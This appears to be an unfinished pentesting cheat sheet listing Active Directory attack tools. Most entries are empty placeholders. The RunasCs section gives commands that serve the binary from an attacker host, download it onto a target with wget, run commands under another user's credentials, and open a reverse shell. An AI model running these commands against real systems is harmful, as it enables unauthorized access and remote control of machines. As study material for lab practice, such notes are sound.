# Tools and Utilities (WIP)

Here we can find some tools and utilities commonly used for practices related to Active Directory:

## <mark style="color:green;">ADPEAS</mark>

* H

## <mark style="color:green;">kerbruter</mark>

* Brute-forcing attacks on Kerberos environments

## <mark style="color:green;">ldapdomaindump</mark>

* H

## <mark style="color:green;">bloodhound</mark>

* H

## <mark style="color:green;">**certutil**</mark>

* Binary for certificate management, encryption, decryption, hashing, file verification, and remote file download, among others.
* It comes by default on Windows Systems

### <mark style="color:yellow;">Commands</mark>

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```powershell
certutil -encode $file $outFile # Convert file to base64 certificate
```
{% endcode %}

## <mark style="color:green;">**RunasCs**</mark>

* The utility to run specific processes with permissions different from the user's current login is provided using explicit credentials.
* [https://github.com/antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs)

### <mark style="color:yellow;">Commands</mark>

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
https://github.com/antonioCoco/RunasCs/releases/tag/v1.5 #go her and download the zip file and decompress it
```
{% endcode %}

***

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
#Host machine
cd RunasCs
python3 -m http.server $port #Create server to send file

#Target machine
cd C:\
mkdir Temp
cd Temp
wget http://$MyIP:$port/RunasCs.exe -outFile  RunasCs.exe
RunasCs.exe $username $pass $command #Execute a command as another user
RunasCs.exe $username $pass $command -r $IP:$port #Execute and generate RevShell
```
{% endcode %}

## <mark style="color:green;">Netexec</mark>

* H

## <mark style="color:green;">SMBmap</mark>

* H

## <mark style="color:green;">bloody</mark>

* H

## <mark style="color:green;">pwdump</mark>

* H

## <mark style="color:green;">Powerview</mark>

* H

## <mark style="color:green;">ophcrack</mark>

* H
